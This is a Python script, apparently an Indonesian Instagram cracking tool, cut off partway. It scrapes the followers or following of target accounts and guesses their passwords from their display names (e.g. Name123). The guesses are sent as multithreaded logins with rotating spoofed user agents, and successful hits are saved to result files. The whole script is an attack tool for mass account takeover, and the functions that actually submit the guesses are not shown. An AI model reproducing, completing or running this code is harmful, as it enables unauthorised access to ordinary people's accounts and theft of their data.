import urllib.parse
from urllib.parse import quote
import re, os, sys, json, random, urllib, urllib.request, hmac, hashlib, time, string, uuid, requests, base64,datetime,subprocess
from concurrent.futures import ThreadPoolExecutor
import requests,bs4,json,os,sys,random,datetime,time,re
from bs4 import BeautifulSoup as bsp
from rich.console import Console
from rich.panel import Panel 
from rich import print as prints
import threading
from rich.console import Console as sol
import time
from rich.table import Table as me
import datetime
from rich.columns import Columns
from rich.progress import Progress,TextColumn,SpinnerColumn
from string import *
xyz=[]
# Define color codes for output styling
B = '\x1b[1;94m'  # BLUE
U = '\x1b[1;95m'  # PURPLE
O = '\x1b[1;96m'  # LIGHT BLUE
N = '\x1b[0m'     # RESET
H = "\033[0;92m"   # GREEN
K = "\033[0;93m"   # YELLOW
M = '\x1b[1;91m'   # RED
P = "\033[0m"      # WHITE
P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
H = "\033[32m"
K = "\033[33m"
M, K2 = K, K
P = '\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
H = '\x1b[1;92m' # HIJAU +
h = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
B = '\x1b[1;94m'
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
H = "\033[0;92m" # HIJAU
K = "\033[0;93m" #KUNING
M = '\x1b[1;91m' # MERAH
P = "\033[0m" # PUTIH

#------------------[ WARNA FOR RICH ]-------------------#
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

#------------------[ RANDOM COLOR RICH ]-------------------#
L1 = "[#875f5f]" # LIGHT
G1  = "[#ffd700]" # GOLD
M1  = "[#875fd7]" # MEDIUM GREEN
P1   = "[#FF00FF]" # PINK
W1  = "[#FFFFFF]" # WHITE
S1   = "[#87afff]" # SKY BLUE
O1   = "[#d78700]" # ORANGE3
O3   = "[#ff5fff]" # MEDIUM ORCH3

#------------------[ COLOR TABLE FOR RICH ]-------------------#
LIGHT = "#875f5f" # LIGHT
GOLD    = "#ffd700" # GOLD
MEDIUM  = "#875fd7" # MEDIUM GREEN
PINK    = "#FF00FF" # PINK
WHITE  = "#FFFFFF" # WHITE
SKY     = "#87afff" # SKY BLUE
ORNG   = "#d78700" # ORANGE3
ORCH   = "#ff5fff" # MEDIUM ORCH

ses = requests.Session()
X_IG_APP_ID = random.choice(["936619743392459" , "2763362503905702" , "1217981644879628"])
IG_API = 'https://i.instagram.com/api/v1/'
IG_URL = 'z.p42.www.instagram.com'
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': X_IG_APP_ID,'x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
headers_log = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/x-www-form-urlencoded',
}

xx = 0
rr = random.randint;rc = random.choice
console = Console()
Uid, Uuid , Uuid4= [], [], []
Ok, Cp, Loop = 0, 0, 0
getuserid = 'https://i.instagram.com/api/v1/users/web_profile_info/?username={nama!s}'
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': '1217981644879628','x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
ua = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
userinfo  = 'https://i.instagram.com/api/v1/users/{id!s}/info/'


dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
Okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
Cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

def generate_random_ua():
    devices = ['Android', 'iPhone', 'Windows']
    os_version = random.choice(['10', '11', '12'])
    device_type = random.choice(devices)
    browser_version = random.randint(40, 100)
    ua = f"Mozilla/5.0 ({device_type}; {os_version} OS) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{browser_version}.0.0.0 Mobile Safari/537.36"
    return ua

def InstaIgeh():
    rr = random.randint
    rc = random.choice
    UA1 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(9,14))}_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 Instagram 31.0.0.14.97 (iPhone9,1; iOS {str(rr(9,14))}_2_5; en_US; en-US; scale=2.00; gamut=wide; {str(rr(700,799))}x{str(rr(1300,1500))})"
    UA2 = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; SAMSUNG.{str(rr(111111,211111))}.SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/{str(rr(73,150))}.92.0.4515.166.{str(rr(5500,5900))}.{str(rr(75,99))} Mobile Safari/537.36"
    UA3 = f"Mozilla/5.0 (Linux; Android 7.0; LGT32 Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Safari/537.36 Instagram 258.1.0.26.100 Android (24/7.0; {str(rr(200,240))}dpi; {str(rr(1100,1200))}x{str(rr(1800,1900))}; LGE/KDDI; LGT32; b5; b5; ja_JP; 412452718)"
    uacrack6 = f"Mozilla/5.0 (Linux; Android 8.0.0; ONEPLUS A5000 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.65.0.3325.109.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (26/8.0.0;{str(rr(200,240))}480dpi; {str(rr(1100,1200))}1080x1920{str(rr(1800,1900))}; OnePlus; ONEPLUS A5000; OnePlus5; qcom; ru_UA; 98288242)"
    UA7 = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX1851 Build/RKQ1..{str(rr(111111,211111))}.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.95.0.4638.74.{str(rr(5500,5900))}.{str(rr(75,99))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/381.0.0.29.105;]"
    UA5 = f"Mozilla/5.0 (Linux; Android 10; Infinix X682B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.88.0.4324.93.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram 172.0.0.21.123 Android (29/10;  {str(rr(200,240))}320dpi; {str(rr(1100,1200))}720x1464{str(rr(1800,1900))} ; INFINIX MOBILITY LIMITED/Infinix; Infinix X682B; Infinix-X682B; mt6769; tr_TR; 269790803)"
    satu = f"Mozilla/5.0 (Linux; Android 12; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 wkbrowser 5.0.17 {str(rr(2111111,2999999))} js 5.1.1 newfocus lng=ru"
    empat  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    lima  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; IN2013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    UaMainn = random.choice([UA1, UA2, UA3,uacrack6,UA7,UA5,satu,dua,tiga,empat,lima])
    return UaMainn

def aguss():
    rr = random.randint
    rc = random.choice
    fbcr = str(
        random.choice([
            'TELKOMSEL', 'AXIS', 'Indosat', 'XL', '3SinyalKuatHemat',
            'Tsel-PakaiMasker', 'XL Axiata'
        ]))
    androversi = random.choice(["15_4", "14_3", "13_5", "14_5", "13_4"])
    build = ['MRA58K', 'UCC50Z', 'QKQ1.200127.002']
    andro = ['k', 'a', 'b', 'x', 'y', 'z', 'd', 'l']
    browser = ['HeyTapBrowser', 'MZBrowser']
    asep1 = random.choice(["Y6MLQN", "8G7LN3", "2783VM", "X35XFL", "W5T30Y"])
    asep4 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {androversi} like Mac OS X) AppleWebKit/{str(rr(500,800))}.{str(rr(2,50))} (KHTML, like Gecko) Version/{str(rr(10,20))}.{str(rr(4,80))} Mobile/{asep1} Safari/{str(rr(500,800))}.{str(rr(2,30))}"
    asep5 = f"Mozilla/5.0 (Linux; Android {androversi} SM-N960N Build/QP1A.190711.020; wv) AppleWebKit/{str(rr(500,800))}.{str(rr(2,50))} (KHTML, like Gecko) Version/4.0 Chrome/{rr(10,99)}.0.{rr(1000,9999)}.{rr(73,150)} Whale/1.0.0.0 Crosswalk/25.80.14.20 Mobile Safari/537.36 NAVER(inapp; search; 598; 10.28.2)"
    asep10 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; itel A663L Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36"
    asep6 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; Infinix X6832 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/455.0.0.44.88;]"
    asep7 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; V1818CA Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36 VivoBrowser/18.6.0.0"
    asep8 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; zh-tw; PCLM50 AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36 HeyTapBrowser/40.8.27.1"
    asep9 = f"Mozilla/5.0 (Linux; AndroId {str(rr(2,13))}; zh-CN; M2104K10AC Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} UCBrowser/16.3.8.1289 Mobile Safari/537.36"
    v1 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; meizu 17 Pro Build/{str(rc(build))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4900))}.{str(rr(73,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/349.0.0.39.470;]"
    v2 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; meizu 17 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,99))}.0.{str(rr(3000,4999))}.{str(rr(73,150))} Mobile Safari/537.36"
    v3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(2,13))}; zh-CN; MZ-meizu 17 Pro Build/{str(rc(build))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4999))}.{str(rr(73,150))} MZBrowser/8.{str(rr(1,20))}.1 Mobile Safari/537.36"
    v4 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; {str(rc(andro))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(59,169))}.0.0.0 Mobile Safari/537.36"
    hir = f"Mozilla/5.0 (Linux; U; Android {str(rr(2,13))}; zh-CN MZ-MEIZU 18 Build/{str(rc(build))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4900))}.{str(rr(100,150))} {str(rc(browser))}/9.{str(rr(1,20))}.1 Mobile safari/537.36"
    ua_rmx = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; RMX{str(rr(1599,3999))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(89,120))}.0.{str(rr(3999,4999))}.{str(rr(55,129))} Mobile Safari/537.36"
    ua_oppo = f"Mozilla/5.0 (Linux; Android {str(rr(4,13))}; CPH{str(rr(1999,4999))} Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(59,159))}.0.{str(rr(2999,4999))}.{str(rr(55,159))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/280.0.0.48.122;]"
    ya = random.choice([hir, asep4,asep5, asep10, asep6, asep7, asep8, asep9, v1, v2, v3, v4,ua_rmx,ua_oppo])
    return ya

def Aset_Ig():
    os.system('clear')
    if os.path.isfile('.Cokies-IG.txt') is True:
        coki = {'cookie': open('.Cokies-IG.txt', 'r').read()}
    else:
        username = input(f'└──╭➣ {H}Masukan Username :{H} ')
        password = input(f'└──╭➣ {H}Masukan Password :{H} ')
        url = 'https://www.instagram.com/accounts/login/ajax/'
        response = ses.get('https://www.instagram.com/accounts/login/', headers=headers_log)
        csrf_token = response.cookies.get('csrftoken')
        login_headers = {
            'User-Agent': generate_random_ua(),
            'X-CSRFToken': csrf_token,
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
        }

        data = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1605155817:{password}',  # Format the password with timestamp
        }
        login_response = ses.post(url, headers=login_headers, data=data, cookies={'csrftoken': csrf_token})
        if login_response.status_code == 200 and 'authenticated' in login_response.json() and login_response.json()['authenticated']:
            x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s" % username, headers={"user-agent": generate_random_ua(), "x-ig-app-id": '936619743392459'})
            usres = ses.get('https://www.instagram.com/push/web/get_push_info').json()['data']['user_id']
            x_json = x.json()["data"]["user"]
            pengikut = x_json["edge_followed_by"]["count"]
            mengikut = x_json["edge_follow"]["count"]
            postingan = x_json["edge_owner_to_timeline_media"]["count"]
            cookie = ";".join([key + "=" + value.replace('"', '') for key, value in ses.cookies.get_dict().items()])
            print(f"\n{B}{username} {password}{N}")
            print(f"{H}Followers: {O}{pengikut}{N}")
            print(f"{H}Posts: {O}{postingan}{N}")
            print(f"{H}Following: {O}{mengikut}{N}")
            print(f"{B}Cookies:{N}\n{P}{cookie}{N}")
            print(f"{H}Login successful!{N}")
            print(f"{H}User ID Akun: {O}{usres}{N}")
            coki = cookie
        else:
            prints(Panel(f"{P2}opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.",width=80,style=f"bold green"));os.system('rm -rf .kukis.txt');exit()
            return False
    try:
        uid = re.search(r'ds_user_id=(\d+)', str(coki['cookie'])).group(1)
        req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki).json()
        if 'user' in req:
            req = req['user']
            open('.Cokies-IG.txt', 'w').write(f'{coki["cookie"]}')
            full_name = req['full_name']
            username = req['username']
            follower_count = req['follower_count']
            following_count = req['following_count']
            media_count = req['media_count']
            return coki, full_name, username, follower_count, following_count, media_count
        else:
            os.system('rm -rf .Cokies-IG.txt')
            print(f" {M}cookies Invalid Gunakan Cookies yang Lain!")
            time.sleep(3)
            return None, None, None, None, None, None  
    except Exception as e:
        os.system('rm -rf .Cokies-IG.txt')
        print(f" {M}cookies Invalid Gunakan Cookies yang Lain!")
        time.sleep(3)
        return None, None, None, None, None, None 


def login_to_instagram(username, password):
    url = 'https://www.instagram.com/accounts/login/ajax/'
    response = ses.get('https://www.instagram.com/accounts/login/', headers=headers_log)
    csrf_token = response.cookies.get('csrftoken')
    login_headers = {
        'User-Agent': generate_random_ua(),
        'X-CSRFToken': csrf_token,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/accounts/login/',
    }

    data = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1605155817:{password}',  # Format the password with timestamp
    }
    login_response = ses.post(url, headers=login_headers, data=data, cookies={'csrftoken': csrf_token})
    if login_response.status_code == 200 and 'authenticated' in login_response.json() and login_response.json()['authenticated']:
        x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s" % username, headers={"user-agent": generate_random_ua(), "x-ig-app-id": '936619743392459'})
        usres = ses.get('https://www.instagram.com/push/web/get_push_info').json()['data']['user_id']
        x_json = x.json()["data"]["user"]
        pengikut = x_json["edge_followed_by"]["count"]
        mengikut = x_json["edge_follow"]["count"]
        postingan = x_json["edge_owner_to_timeline_media"]["count"]
        cookie = ";".join([key + "=" + value.replace('"', '') for key, value in ses.cookies.get_dict().items()])
        print(f"\n{B}{username} {password}{N}")
        print(f"{H}Followers: {O}{pengikut}{N}")
        print(f"{H}Posts: {O}{postingan}{N}")
        print(f"{H}Following: {O}{mengikut}{N}")
        print(f"{B}Cookies:{N}\n{P}{cookie}{N}")
        print(f"{H}Login successful!{N}")
        print(f"{H}User ID Akun: {O}{usres}{N}")
    else:
        prints(Panel(f"{P2}opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.",width=80,style=f"bold green"));os.system('rm -rf .kukis.txt');exit()
        return False
        

def menu():
    os.system('clear')
    aset, full_name, username, fol, following, media = Aset_Ig()
    if aset is None:
        time.sleep(3)
        return
    os.system('clear')
    tabel1 = "01\n02\n00"
    tabel2 = (
        "Crack Dari Pengikut\nCrack Dari Mengikuti\nGanti Cookie"
    )
    tabel3 = "ON\nON\nON"
    colume_tabel = me()
    colume_tabel.add_column("NO", style="bold green", justify='center')
    colume_tabel.add_column("PILIHAN", style="bold green", justify='center', width=55)
    colume_tabel.add_column("STATUS", style="bold green", justify='center')
    colume_tabel.add_row(tabel1, tabel2, tabel3)
    sol().print(colume_tabel, justify='start', style="bold green")
    x = input('└──╭➣ Pilih 1 Sampai 3: ')
    if x in ['01','1']:
        dumps(aset, True)
    elif x in ['02','2']:
        dumps(aset, False)
    elif x in ['00','0']:
        os.system('rm -rf .Cokies-IG.txt')
        print("berhasil menghapus cookies")
        exit()

def dumps(kuki, typess, xyz=[]):
	if 'csrftoken' not in str(kuki):
		try:
			memek = requests.get('https://www.instagram.com/data/shared_data/', cookies=kuki).json()
			token = memek['config']['csrf_token']
			kuki['cookie'] += ';csrftoken=%s;' % (token)
		except:
			os.system('rm -rf .Cokies-IG.txt')
			exit()
	print(f" \n{b}[{P}●{b}]{P} Your Targets Usernames")         
	users = input(f'    {b}＼{P} Targets User : {b}').split(',')
	print(f" \n{b}[{P}●{b}]{P} Process Collecting Username")         
	threads = []
	for y in users:
		thread = threading.Thread(target=process_user, args=(y, kuki, typess, xyz))
		threads.append(thread)
		thread.start()
	for thread in threads:
		thread.join()
	print("")
	Metode()

def process_user(user, kuki, typess, xyz):
	req = requests.get(f'https://www.instagram.com/{user}/', cookies=kuki).text
	match = re.search(r'"user_id":"(\d+)"', str(req))
	if match:
		uid = match.group(1)
		if uid not in xyz:
			xyz.append(uid)
		mode = 'followers' if typess is True else 'following'
		Graphql(typess, uid, kuki['cookie'], '')

def Graphql(typess, userid, cokie, after):
    global xx
    api = "https://www.instagram.com/graphql/query/"
    csr = 'variables={"id":"%s","first":24,"after":"%s"}' % (userid, after)
    mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr) if typess is False else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
    try:
        ptk = {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "cookie": cokie
        }
        req = requests.get(api, params=mek, headers=ptk).json()
        if 'require_login' in req:
            if len(Uuid) > 0:
                pass
            else:
                exit(f'\n{B}[{b}●{B}]{M} Invalid Cookie')
        khm = 'edge_followed_by' if typess is True else 'edge_follow'
        for xyz in req['data']['user'][khm]['edges']:
            username = xyz['node']['username']
            xy = xyz['node']['username'] + '|' + xyz['node']['full_name']
            if xy not in Uuid:
                xx += 1
                Uuid.append(xy)
                print(f'\r    {b}＼{P} Collected ID : {b}{len(Uuid)}', end='')
                open('dump.txt', 'w').write('\n'.join(Uuid))
        end = req['data']['user'][khm]['page_info']['has_next_page']
        if end is True:
            after = req['data']['user'][khm]['page_info']['end_cursor']
            Graphql(typess, userid, cokie, after)
    except:
        pass


def Metode(): 
	global Login_Dengan
	print(f" \n{b}[{P}●{b}] {P}Your Choice Login Menthod ")
	print(f'    {b}1{P}. Login Instagram With Metode ({b}WEBS{P}) ')
	print(f'    {b}2{P}. Login Instagram With Metode ({b}APPS{P}) ')
	print(f'    {b}3{P}. Login Instagram With Metode ({b}AJAX{P}) ')
	print(f'    {b}3{P}. Login Instagram With Metode ({b}WWW.I{P}) ')
	method = input(f'{b}     ╰─{P}›{b} ')
	if method in ['01','1']: Login_Dengan = "api.instagram.com"
	elif method in ['02','2']: Login_Dengan = "i.instagram.com"
	elif method in ['03','3']: Login_Dengan = "www.instagram.com"
	elif method in ['04','4']: Login_Dengan = "web.instagram.com"
	else:Login_Dengan = "api.instagram.com"
	SetCrack()

def SetCrack():
    print(f" \n{b}[{P}●{b}]{P} Result Save In ")
    print(f'    {b}＼{P}.RESULTS-INSTAGRAM/{b}{Okc}')
    print(f'    {b}＼{P}.RESULTS-INSTAGRAM/{b}{Cpc}')
    print(f" \n{b}[{P}●{b}]{P} Crack Process Begins Turn Off Airplane Mode Every{b} 500 ID\n ")
    with ThreadPoolExecutor (max_workers=30) as ASF:
        for i in Uuid:
            try:
                username, name = i.split('|')
                kontol = Password(name)
                if Login_Dengan == "api.instagram.com":
                    ASF.submit(Crack_api, username, kontol)
                elif Login_Dengan == "i.instagram.com":
                    ASF.submit(Crack_i, username, kontol)
                elif Login_Dengan == "www.instagram.com":
                    ASF.submit(crack_ajax, username, kontol)
                elif Login_Dengan == "web.instagram.com":
                    ASF.submit(crack, username, kontol)
            except:pass
    exit(' \n\n Crack Telah Selesai')
	
def Password(name):
	xxzx = []
	full = name.replace('_', ' ').replace('.', ' ').replace('@', ' ')
	for nama in full.split(' '):
		if len(nama) < 3: 
			continue
		base_nama = nama.replace(' ', '').capitalize()
		xxzx.append(base_nama)
		xxzx.append(base_nama + '01')
		xxzx.append(base_nama + '02')
		xxzx.append(base_nama + '03')
		xxzx.append(base_nama + '04')
		xxzx.append(base_nama + '05')
		xxzx.append(base_nama + '06')
		xxzx.append(base_nama + '07')
		xxzx.append(base_nama + '08')
		xxzx.append(base_nama + '09')
		xxzx.append(base_nama + '10')
		if len(nama) >= 4:
			xxzx.append(base_nama + '12')        	
			xxzx.append(base_nama + '123')
			xxzx.append(base_nama + '1234')
			xxzx.append(base_nama + '12345')
			xxzx.append(base_nama + '123456')
		else:
			xxzx.append('kamu nanya')
			xxzx.append('sayangku123')
			xxzx.append('Bengkulu')
	return xxzx

def convert_cookie(item):
	try:
		sesid = 'sessionid=' + re.findall(r'sessionid=(\d+)', str(item))[0]
		ds_id = 'ds_user_id=' + re.findall(r'ds_user_id=(\d+)', str(item))[0]
		csrft = 'csrftoken=' + re.findall(r'csrftoken=(.*?);', str(item))[0]
		donez = '%s;%s;%s;ig_nrcb=1;dpr=2'%(ds_id, sesid, csrft)
	except Exception as e:
		donez = 'cookies tidak di temukan, error saat convert'
	return donez

ses = requests.Session()
def data_target(name):
	for y in name.split(','):
		try:
			HEADERS.update({'user-agent'  : 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)','x-ig-app-id' :'1217981644879628'})
			profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers = HEADERS).json()['data']['user']
			post      = profil_info_target["edge_owner_to_timeline_media"]["count"]
			peng  = profil_info_target["edge_followed_by"]["count"]
			meng = profil_info_target["edge_follow"]["count"]
			mail = profil_info_target["business_email"]
			phone = profil_info_target["business_phone_number"]
			fullname = profil_info_target["full_name"]
			fbid = profil_info_target["fbid"]
		except Exception as e:
			post, peng, meng, mail, fullname, fbid, phone = None, None, None, None, None,  None, None
	return post, peng, meng, mail, fullname, fbid, phone


def Android_Version(android_version):
	if str(android_version) == '9':
		return ('28')
	elif str(android_version) == '10':
		return ('29')
	elif str(android_version) == '11':
		return ('30')
	elif str(android_version) == '12':
		return ('31')
	else:
		return ('32')

def UserAgentBarcelona():
	#; #
	dpi_pixel = random.choice(['240dpi; 1760x792', '240dpi; 1920x864', '320dpi; 2400x1080', '400dpi; 3200x1440', '480dpi; 1080x1920', '320dpi; 900x1600', '320dpi; 720x1280', '240dpi; 540x960', '280dpi; 1920x1080', '240dpi; 160x900', '240dpi; 1280x720', '160dpi; 960x540'])
	android_version = random.choice(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
	kode=rc(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219',